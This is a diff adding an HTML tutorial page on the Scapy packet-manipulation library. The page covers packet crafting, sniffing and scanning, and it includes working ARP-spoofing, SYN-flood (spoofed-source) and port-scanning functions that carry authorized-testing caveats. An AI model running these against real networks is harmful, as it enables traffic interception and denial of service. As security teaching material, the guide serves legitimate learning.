@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scapy Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>Scapy: Python Packet Manipulation Library</h1>
+            <p>Master Advanced Packet Crafting and Network Analysis</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is Scapy?</h2>
+                <p>Scapy is a powerful Python-based interactive packet manipulation program and library. It can forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. It can easily handle most classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery. It's an excellent tool for network security professionals, researchers, and anyone who needs to work with network packets at a low level.</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Python Package Installation</h3>
+                    <pre><code># Install via pip
+pip install scapy
+
+# Install with additional dependencies
+pip install scapy[complete]
+
+# Install development version
+pip install git+https://github.com/secdev/scapy.git
+
+# Install specific version
+pip install scapy==2.4.5</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>System Dependencies</h3>
+                    <pre><code># Ubuntu/Debian
+sudo apt update
+sudo apt install python3-pip python3-dev libpcap-dev
+
+# CentOS/RHEL
+sudo yum install python3-pip python3-devel libpcap-devel
+
+# macOS (with Homebrew)
+brew install python libpcap
+
+# Windows (requires WinPcap or Npcap)
+# Download from: https://nmap.org/npcap/</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Verification</h3>
+                    <pre><code># Test installation
+python3 -c "import scapy; print(scapy.__version__)"
+
+# Start interactive session
+sudo python3
+>>> from scapy.all import *
+>>> ls()  # List available protocols</code></pre>
+                </div>
+            </section>
+
+            <section id="basic-usage">
+                <h2>Basic Usage & Interactive Mode</h2>
+                <div class="command-block">
+                    <h3>Starting Scapy</h3>
+                    <pre><code># Interactive mode (requires root for packet injection)
+sudo scapy
+
+# Python script mode
+sudo python3 your_script.py
+
+# Import in Python
+from scapy.all import *</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Basic Commands</h3>
+                    <pre><code># List available protocols
+ls()
+
+# Get help for a protocol
+ls(IP)
+ls(TCP)
+
+# Show packet structure
+IP().show()
+TCP().show()
+
+# Create simple packet
+packet = IP(dst="8.8.8.8")/ICMP()
+packet.show()</code></pre>
+                </div>
+            </section>
+
+            <section id="packet-creation">
+                <h2>Packet Creation & Manipulation</h2>
+                <div class="command-block">
+                    <h3>Basic Packet Construction</h3>
+                    <pre><code># ICMP packet
+icmp_packet = IP(dst="8.8.8.8")/ICMP()
+
+# TCP SYN packet
+syn_packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
+
+# UDP packet
+udp_packet = IP(dst="192.168.1.1")/UDP(dport=53)/"Hello World"
+
+# ARP packet
+arp_packet = ARP(op=1, pdst="192.168.1.1")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Layer Stacking</h3>
+                    <pre><code># HTTP request over TCP
+http_packet = IP(dst="example.com")/TCP(dport=80)/Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+
+# DNS query
+dns_packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
+
+# Ethernet frame
+eth_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst="192.168.1.255")/ICMP()</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Field Manipulation</h3>
+                    <pre><code># Set specific fields
+packet = IP()
+packet.dst = "192.168.1.100"
+packet.ttl = 64
+packet.id = 12345
+
+# TCP flags
+tcp_packet = TCP()
+tcp_packet.flags = "SA"  # SYN+ACK
+tcp_packet.seq = 1000
+tcp_packet.ack = 2000
+
+# Multiple field assignment
+packet = IP(dst="192.168.1.1", ttl=128, id=54321)</code></pre>
+                </div>
+            </section>
+
+            <section id="sending-packets">
+                <h2>Sending Packets</h2>
+                <div class="command-block">
+                    <h3>Layer 3 Sending</h3>
+                    <pre><code># Send packet at IP layer
+send(IP(dst="8.8.8.8")/ICMP())
+
+# Send and receive (sr1 for single packet)
+response = sr1(IP(dst="8.8.8.8")/ICMP())
+response.show()
+
+# Send multiple packets
+send(IP(dst="8.8.8.8")/ICMP(), count=5)
+
+# Send with custom interface
+send(IP(dst="8.8.8.8")/ICMP(), iface="eth0")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Layer 2 Sending</h3>
+                    <pre><code># Send at Ethernet layer
+sendp(Ether()/IP(dst="192.168.1.1")/ICMP())
+
+# Send ARP request
+sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1"))
+
+# Send with specific source MAC
+sendp(Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff")/IP(dst="192.168.1.255")/ICMP())</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Advanced Sending</h3>
+                    <pre><code># Send and receive multiple packets
+ans, unans = sr(IP(dst="192.168.1.1-10")/ICMP())
+
+# Send with timeout
+response = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
+
+# Send at specific rate
+send(IP(dst="8.8.8.8")/ICMP(), inter=0.1, count=10)  # 0.1 second interval</code></pre>
+                </div>
+            </section>
+
+            <section id="packet-capture">
+                <h2>Packet Capture & Sniffing</h2>
+                <div class="command-block">
+                    <h3>Basic Sniffing</h3>
+                    <pre><code># Capture packets
+packets = sniff(count=10)
+packets.show()
+
+# Capture on specific interface
+packets = sniff(iface="eth0", count=10)
+
+# Capture with filter
+packets = sniff(filter="tcp port 80", count=10)
+
+# Capture with timeout
+packets = sniff(timeout=30)</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Advanced Filtering</h3>
+                    <pre><code># BPF filters
+sniff(filter="host 192.168.1.1", count=10)
+sniff(filter="tcp and port 443", count=10)
+sniff(filter="icmp or arp", count=10)
+
+# Custom packet processing
+def packet_handler(packet):
+    if packet.haslayer(TCP):
+        print(f"TCP packet: {packet[IP].src} -> {packet[IP].dst}")
+
+sniff(prn=packet_handler, count=10)</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Offline Analysis</h3>
+                    <pre><code># Read from pcap file
+packets = rdpcap("capture.pcap")
+
+# Write to pcap file
+wrpcap("output.pcap", packets)
+
+# Process captured packets
+for packet in packets:
+    if packet.haslayer(HTTP):
+        print(packet[HTTP].show())</code></pre>
+                </div>
+            </section>
+
+            <section id="network-scanning">
+                <h2>Network Scanning</h2>
+                <div class="command-block">
+                    <h3>Host Discovery</h3>
+                    <pre><code># ICMP ping sweep
+ans, unans = sr(IP(dst="192.168.1.1/24")/ICMP(), timeout=2)
+for sent, received in ans:
+    print(f"{received.src} is alive")
+
+# ARP scan (local network)
+ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
+for sent, received in ans:
+    print(f"{received.psrc} - {received.hwsrc}")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Port Scanning</h3>
+                    <pre><code># TCP SYN scan
+def syn_scan(host, ports):
+    for port in ports:
+        response = sr1(IP(dst=host)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
+        if response and response.haslayer(TCP):
+            if response[TCP].flags == 18:  # SYN+ACK
+                print(f"Port {port}: Open")
+            elif response[TCP].flags == 20:  # RST+ACK
+                print(f"Port {port}: Closed")
+
+# Usage
+syn_scan("192.168.1.1", [22, 80, 443, 8080])
+
+# UDP scan
+def udp_scan(host, ports):
+    for port in ports:
+        response = sr1(IP(dst=host)/UDP(dport=port), timeout=2, verbose=0)
+        if response is None:
+            print(f"UDP Port {port}: Open|Filtered")
+        elif response.haslayer(ICMP):
+            print(f"UDP Port {port}: Closed")
+
+udp_scan("192.168.1.1", [53, 161, 123])</code></pre>
+                </div>
+            </section>
+
+            <section id="protocol-analysis">
+                <h2>Protocol Analysis</h2>
+                <div class="command-block">
+                    <h3>HTTP Analysis</h3>
+                    <pre><code># Capture HTTP traffic
+def analyze_http(packet):
+    if packet.haslayer(Raw):
+        payload = packet[Raw].load.decode('utf-8', errors='ignore')
+        if 'HTTP' in payload:
+            print("HTTP Traffic:")
+            print(payload[:200])  # First 200 characters
+
+sniff(filter="tcp port 80", prn=analyze_http, count=10)
+
+# Extract HTTP headers
+def extract_http_headers(packet):
+    if packet.haslayer(Raw):
+        try:
+            payload = packet[Raw].load.decode('utf-8')
+            if payload.startswith('GET') or payload.startswith('POST'):
+                lines = payload.split('\r\n')
+                for line in lines[:10]:  # First 10 lines
+                    print(line)
+        except:
+            pass
+
+sniff(filter="tcp port 80", prn=extract_http_headers)</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>DNS Analysis</h3>
+                    <pre><code># DNS query analysis
+def analyze_dns(packet):
+    if packet.haslayer(DNS):
+        dns = packet[DNS]
+        if dns.qr == 0:  # Query
+            print(f"DNS Query: {dns.qd.qname.decode()}")
+        else:  # Response
+            print(f"DNS Response: {dns.qd.qname.decode()}")
+            if dns.ancount > 0:
+                print(f"Answer: {dns.an.rdata}")
+
+sniff(filter="udp port 53", prn=analyze_dns, count=10)
+
+# Custom DNS query
+dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
+response = sr1(dns_query)
+if response.haslayer(DNS):
+    print(f"DNS Answer: {response[DNS].an.rdata}")</code></pre>
+                </div>
+            </section>
+
+            <section id="attack-techniques">
+                <h2>Attack Techniques & Security Testing</h2>
+                <div class="command-block">
+                    <h3>ARP Spoofing</h3>
+                    <pre><code># ARP spoofing attack (for testing purposes)
+def arp_spoof(target_ip, gateway_ip, interface="eth0"):
+    # Get MAC addresses
+    target_mac = getmacbyip(target_ip)
+    gateway_mac = getmacbyip(gateway_ip)
+    
+    if target_mac and gateway_mac:
+        # Create spoofed ARP packets
+        packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+        
+        # Send packets
+        send(packet1, iface=interface, verbose=0)
+        send(packet2, iface=interface, verbose=0)
+        print(f"ARP spoofing: {target_ip} <-> {gateway_ip}")
+
+# Usage (for authorized testing only)
+# arp_spoof("192.168.1.100", "192.168.1.1")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>TCP Hijacking Simulation</h3>
+                    <pre><code># TCP sequence prediction (educational)
+def tcp_seq_prediction(target_ip, target_port):
+    # Send multiple SYN packets to analyze sequence numbers
+    responses = []
+    for i in range(5):
+        response = sr1(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), timeout=2)
+        if response and response.haslayer(TCP):
+            responses.append(response[TCP].seq)
+    
+    # Analyze sequence number patterns
+    if len(responses) > 1:
+        diffs = [responses[i+1] - responses[i] for i in range(len(responses)-1)]
+        print(f"Sequence differences: {diffs}")
+        print(f"Average increment: {sum(diffs)/len(diffs)}")
+
+# Usage (for authorized testing only)
+# tcp_seq_prediction("192.168.1.1", 80)</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>DoS Testing</h3>
+                    <pre><code># SYN flood simulation (for testing purposes)
+def syn_flood_test(target_ip, target_port, count=100):
+    for i in range(count):
+        # Random source IP and port
+        src_ip = ".".join([str(RandByte()) for _ in range(4)])
+        src_port = RandShort()
+        
+        # Create SYN packet
+        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
+        send(packet, verbose=0)
+    
+    print(f"Sent {count} SYN packets to {target_ip}:{target_port}")
+
+# Usage (for authorized testing only)
+# syn_flood_test("192.168.1.100", 80, 10)</code></pre>
+                </div>
+            </section>
+
+            <section id="scripting-automation">
+                <h2>Scripting & Automation</h2>
+                <div class="command-block">
+                    <h3>Network Discovery Script</h3>
+                    <pre><code>#!/usr/bin/env python3
+from scapy.all import *
+import sys
+
+def network_discovery(network):
+    print(f"Discovering hosts on {network}")
+    
+    # ARP scan for local network
+    arp_request = ARP(pdst=network)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    
+    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    
+    print("Available devices:")
+    print("IP\t\t\tMAC Address")
+    print("-" * 40)
+    
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        print(f"{client_dict['ip']}\t\t{client_dict['mac']}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 discovery.py <network>")
+        print("Example: python3 discovery.py 192.168.1.0/24")
+        sys.exit(1)
+    
+    network_discovery(sys.argv[1])</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Port Scanner Script</h3>
+                    <pre><code>#!/usr/bin/env python3
+from scapy.all import *
+import sys
+import threading
+
+def scan_port(host, port):
+    try:
+        # Create SYN packet
+        syn_packet = IP(dst=host)/TCP(dport=port, flags="S")
+        response = sr1(syn_packet, timeout=1, verbose=0)
+        
+        if response:
+            if response.haslayer(TCP):
+                if response[TCP].flags == 18:  # SYN+ACK
+                    print(f"Port {port}: Open")
+                    # Send RST to close connection
+                    rst_packet = IP(dst=host)/TCP(dport=port, flags="R")
+                    send(rst_packet, verbose=0)
+                elif response[TCP].flags == 20:  # RST+ACK
+                    pass  # Port closed
+    except:
+        pass
+
+def port_scan(host, ports):
+    print(f"Scanning {host} for open ports...")
+    threads = []
+    
+    for port in ports:
+        thread = threading.Thread(target=scan_port, args=(host, port))
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 portscan.py <host>")
+        sys.exit(1)
+    
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080]
+    port_scan(sys.argv[1], common_ports)</code></pre>
+                </div>
+            </section>
+
+            <section id="advanced-features">
+                <h2>Advanced Features</h2>
+                <div class="command-block">
+                    <h3>Custom Protocols</h3>
+                    <pre><code># Define custom protocol
+class CustomProtocol(Packet):
+    name = "CustomProtocol"
+    fields_desc = [
+        ByteField("version", 1),
+        ByteField("type", 0),
+        ShortField("length", 0),
+        StrLenField("data", "", length_from=lambda pkt: pkt.length)
+    ]
+
+# Use custom protocol
+custom_packet = IP(dst="192.168.1.1")/UDP(dport=12345)/CustomProtocol(type=1, data="Hello")
+send(custom_packet)</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Packet Fuzzing</h3>
+                    <pre><code># Fuzz IP header
+fuzzed_packet = IP(dst="192.168.1.1", flags=RandByte(), frag=RandShort())/ICMP()
+
+# Fuzz TCP header
+fuzzed_tcp = IP(dst="192.168.1.1")/TCP(dport=80, flags=RandByte(), options=RandString(10))
+
+# Send fuzzed packets
+send(fuzzed_packet, count=10)
+
+# Fuzz specific fields
+def fuzz_tcp_flags(host, port):
+    for i in range(256):
+        packet = IP(dst=host)/TCP(dport=port, flags=i)
+        send(packet, verbose=0)
+    print(f"Sent 256 packets with different TCP flags to {host}:{port}")
+
+# fuzz_tcp_flags("192.168.1.1", 80)</code></pre>
+                </div>
+            </section>
+
+            <section id="integration">
+                <h2>Integration with Other Tools</h2>
+                <div class="command-block">
+                    <h3>Wireshark Integration</h3>
+                    <pre><code># Save packets for Wireshark analysis
+packets = sniff(count=100)
+wrpcap("scapy_capture.pcap", packets)
+
+# Read Wireshark captures
+wireshark_packets = rdpcap("wireshark_capture.pcap")
+for packet in wireshark_packets:
+    if packet.haslayer(TCP):
+        print(f"TCP: {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Nmap Integration</h3>
+                    <pre><code># Complement Nmap scans with Scapy
+import subprocess
+import json
+
+def nmap_scapy_scan(host):
+    # Run Nmap scan
+    nmap_result = subprocess.run(['nmap', '-sS', '-O', host], 
+                                capture_output=True, text=True)
+    print("Nmap Results:")
+    print(nmap_result.stdout)
+    
+    # Follow up with Scapy for detailed analysis
+    print("\nScapy Analysis:")
+    response = sr1(IP(dst=host)/ICMP(), timeout=2)
+    if response:
+        print(f"Host is alive, TTL: {response.ttl}")
+        
+        # OS fingerprinting with Scapy
+        tcp_response = sr1(IP(dst=host)/TCP(dport=80, flags="S"), timeout=2)
+        if tcp_response and tcp_response.haslayer(TCP):
+            print(f"TCP Window Size: {tcp_response[TCP].window}")
+            print(f"TCP Options: {tcp_response[TCP].options}")
+
+# nmap_scapy_scan("192.168.1.1")</code></pre>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Use sudo:</strong> Raw socket operations require root privileges</li>
+                    <li><strong>Handle exceptions:</strong> Network operations can fail unpredictably</li>
+                    <li><strong>Set timeouts:</strong> Prevent scripts from hanging indefinitely</li>
+                    <li><strong>Use verbose=0:</strong> Reduce output noise in scripts</li>
+                    <li><strong>Save captures:</strong> Use wrpcap() to save interesting traffic</li>
+                    <li><strong>Thread carefully:</strong> Be cautious with multithreaded packet operations</li>
+                    <li><strong>Test responsibly:</strong> Only test on networks you own or have permission</li>
+                    <li><strong>Learn protocols:</strong> Understanding protocols improves packet crafting</li>
+                </ul>
+            </section>
+
+            <section id="troubleshooting">
+                <h2>Common Issues & Troubleshooting</h2>
+                <div class="command-block">
+                    <h3>Permission Issues</h3>
+                    <pre><code># Run with sudo
+sudo python3 -c "from scapy.all import *; send(IP(dst='8.8.8.8')/ICMP())"
+
+# Check capabilities (Linux)
+sudo setcap cap_net_raw+ep /usr/bin/python3
+
+# Windows: Run as Administrator and install Npcap</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Import Issues</h3>
+                    <pre><code># Check installation
+python3 -c "import scapy; print(scapy.__version__)"
+
+# Install missing dependencies
+pip install scapy[complete]
+
+# Check Python path
+python3 -c "import sys; print(sys.path)"</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Network Issues</h3>
+                    <pre><code># Check interface
+conf.iface = "eth0"  # Set default interface
+
+# List interfaces
+get_if_list()
+
+# Check routing
+conf.route</code></pre>
+                </div>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Scapy should only be used for:</p>
+                    <ul>
+                        <li>Testing your own networks and systems</li>
+                        <li>Authorized penetration testing with written permission</li>
+                        <li>Educational purposes in controlled lab environments</li>
+                        <li>Network research and protocol development</li>
+                        <li>Security tool development and testing</li>
+                    </ul>
+                    <p>Unauthorized packet crafting, network scanning, or attack simulation may violate computer crime laws, network policies, and terms of service. Scapy can be used to perform attacks that may cause service disruption or security breaches. Always obtain proper authorization before testing network security, and ensure compliance with applicable laws and regulations. Use Scapy responsibly and ethically.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
